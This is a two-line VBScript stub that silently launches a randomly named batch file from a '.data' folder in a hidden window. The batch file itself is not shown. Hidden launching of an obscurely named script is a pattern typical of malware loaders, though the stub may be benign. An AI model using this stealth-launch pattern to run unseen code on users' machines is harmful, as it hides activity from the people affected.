Set WshShell = CreateObject("WScript.Shell")
WshShell.Run ".data\Q11jkLaQQT19P0QYhjgZ2.bat", 0, False